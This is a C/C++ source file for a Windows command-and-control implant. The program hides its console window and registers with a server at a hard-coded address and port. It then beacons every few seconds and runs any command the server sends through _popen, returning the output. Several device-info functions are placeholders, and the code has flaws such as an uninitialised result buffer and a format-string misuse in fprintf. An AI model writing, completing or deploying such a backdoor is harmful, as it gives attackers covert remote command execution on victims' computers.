#include <winsock2.h>
#include <windows.h>
#include <stdbool.h>
#include <cstdio>
#include "cJSON/cJSON.h"
#include <fcntl.h>
#include <cstdlib>
#include <unistd.h>

//#pragma comment(lib, "ws2_32.lib")
//#pragma comment(lib, "Secur32.lib")

#define PORT 9999
#define ADDR "127.0.0.1"
#define file_path "Z:\\tmp\\id"
#define BUFFER_SIZE 4096
#define MAX_RESPONSE 20000

class Device {
    public:
    void hideConsole();
    const char* get_hostname();
    const char* get_MAC();
    const char* get_Arch();
};

class Communicate_ {
    private:
    int sock;
    public:
    int conn();
    void reg(Device d);
    void beacon(const char *id);
};

int main() {
    Communicate_ comm;
    Device d;
    d.hideConsole();
    while (1) {
        if (comm.conn() == -1) {
            sleep(300); // use random for 
            continue;
        }
        int file = open(file_path, O_RDONLY);
        if (file == -1) {
            comm.reg(d);
            sleep(300);
            continue;
        }
        char id[BUFFER_SIZE];
        read(file, id, sizeof(id));
        // check if agent_id file exists
        comm.beacon(id);
        sleep(5);
    }

    return 0;
}



int Communicate_::conn() {
    WSADATA wsaData;
    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    serverAddress.sin_addr.s_addr = inet_addr(ADDR);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return -1;
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == (int)INVALID_SOCKET) {
        WSACleanup();
        return -1;
    }
    start_connect:
    if (connect(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        Sleep(30);
        goto start_connect;
    }
    return 0;
}


void Device::hideConsole() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

// change
const char* Device::get_Arch() {
    return "hello";
}

const char* Device::get_hostname() {
    return "hackerpc";
}

const char* Device::get_MAC() {
    return "xx-yy-xx";
}



void Communicate_::beacon(const char *id) {
    cJSON *bea = cJSON_CreateObject();
    cJSON_AddStringToObject(bea, "mode", "beacon");
    cJSON_AddStringToObject(bea, "agent_id", id);
    char *data = cJSON_Print(bea);
    send(sock, data, strlen(data), 0);
    free(data);
    cJSON_Delete(bea);

    char buffer[BUFFER_SIZE];
    int bytes = recv(sock, buffer, sizeof(buffer), 0);
    if (bytes <= 0) {
        // err/
    }
    cJSON *reply = cJSON_Parse(buffer);
    cJSON *mode = cJSON_GetObjectItem(reply, "mode");
    if (strncmp(mode->valuestring, "none", 4) == 0) {
        return;
    }  

    cJSON *task_id = cJSON_GetObjectItem(reply, "task_id");
    cJSON *cmd = cJSON_GetObjectItem(reply, "command");

    // execute command
    // char *result = exec(cmd->valuestring);
    FILE *exec;
    cJSON *re = cJSON_CreateObject();
    char result[MAX_RESPONSE];
    memset(buffer, 0, sizeof(buffer));
    char command_with_redirect[BUFFER_SIZE + 10];
    snprintf(command_with_redirect, sizeof(command_with_redirect), "%s 2>&1", cmd->valuestring);

    exec = _popen(command_with_redirect, "r");
    if (!exec) {
        strcpy(result, "Failed to execute command.\n");

        goto SEND_RESULT;
    }

    while (fgets(buffer, sizeof(buffer), exec) != NULL) {
        strcat(result, buffer);
    }
    // send result
    SEND_RESULT:
    cJSON_AddStringToObject(re, "mode", "result");
    cJSON_AddStringToObject(re, "agent_id", id);
    cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
    cJSON_AddStringToObject(re, "response", result);

    char *result_ = cJSON_Print(re);
    send(sock, result_, strlen(result_), 0);
    fclose(exec);
    cJSON_Delete(re);
    free(result_);
}

void Communicate_::reg(Device d) {
    cJSON *reg = cJSON_CreateObject();
    cJSON_AddStringToObject(reg, "mode", "register");
    cJSON_AddStringToObject(reg, "os", "windows");
    cJSON_AddStringToObject(reg, "mac", d.get_MAC());
    cJSON_AddStringToObject(reg, "hostname", d.get_hostname());
    cJSON_AddStringToObject(reg, "arch", d.get_Arch());
    // send to server
    char *data = cJSON_Print(reg);
    send(sock, data, strlen(data), 0);
    free(data);
    cJSON_Delete(reg);

    char buffer[BUFFER_SIZE];
    int bytes = recv(sock, buffer, sizeof(buffer), 0);
    if (bytes <= 0) {
        // 
    }
    cJSON *reply = cJSON_Parse(buffer);
    cJSON *id = cJSON_GetObjectItem(reply, "agent_id");

    // store id in a file
    // file path
    STORE_ID:
    
    FILE *f = fopen(file_path, "w");
    if (!f) {
        sleep(3000);
        goto STORE_ID;
    }

    fprintf(f, id->valuestring);
    //fwrite(id->valuestring, 1, sizeof(id->valuestring), f);
    fclose(f);
    cJSON_Delete(reply);
}
